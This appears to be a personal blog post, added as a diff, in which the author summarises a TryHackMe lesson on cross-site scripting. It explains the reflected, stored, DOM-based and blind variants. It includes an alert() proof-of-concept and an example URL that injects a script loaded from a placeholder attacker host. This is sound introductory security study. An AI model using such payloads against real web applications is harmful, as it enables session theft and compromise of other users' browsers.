@@ -1,0 +1,25 @@
+---
+layout: post
+title: "30 Days of THM Day 23"
+date: 2024-07-04 10:00:00 +0000
+categories: [post, hacking]
+tags: [post, hacking, medium]
+---
+
+Welcome back to 30 Days of TryHackMe, where I try to build a learning streak using the cybersecurity learning platform, TryHackMe. Today, I am tackling the next room on the Web Fundamentals path, Intro to Cross-site Scripting.
+
+
+Cross-site Scripting (XSS) is an injection where malicious JavaScript is injected into a web application. XSS is based on JavaScript, and they are extremely common and reporting those vulnerabilities can pay very well.
+
+The payload is the malicious JavaScript code. The simplest of the payloads would be something like ‘<script>alert(‘XSS’);</script>’. This is often used as a proof of concept. XSS can also be used for session stealing and key logging.
+
+Reflected XSS is when user-supplied data in an HTTP request is included in the webpage source without any validation. For example, let’s say a user enters incorrect input on a website,
+
+http://webapp.com, and an error message pops up, and the content of the error message gets taken from the error parameter and is built into the page source. The url would look something like http://webapp.com/?error=invalid input detected. Malicious code can be inserted like http://webapp.com/?error=<script src=”http://evilwebsite.com/evil.js"></script>. When testing for Reflected XSS, you will want to look for parameters in the URL query string, the URL file path, and sometimes the HTTP Headers.
+
+In a stored XSS attack, the payload is stored on the web application, in a database, and then gets run when other users visit the web page. For example, in a website that allows comments, malicious code can potentially be implemented into one of those comments. Any user visiting the article will have the JavaScript run in their browser. When looking for Stored XSS, you’ll want to test every possible point of entry. Common places to look are comments on a blog, user profile information, and website listings.
+
+DOM Based XSS is another type of XSS. The DOM is the Document Object Model, and it is a programming interface that represents the web page. DOM Based XSS is when the JavaScript execution happens without any new web pages being loaded or acting on user interaction.
+
+Blind XSS is like a stored XSS in that the payload is stored on the web application, but you won’t be able to see the payload working or test it.
+
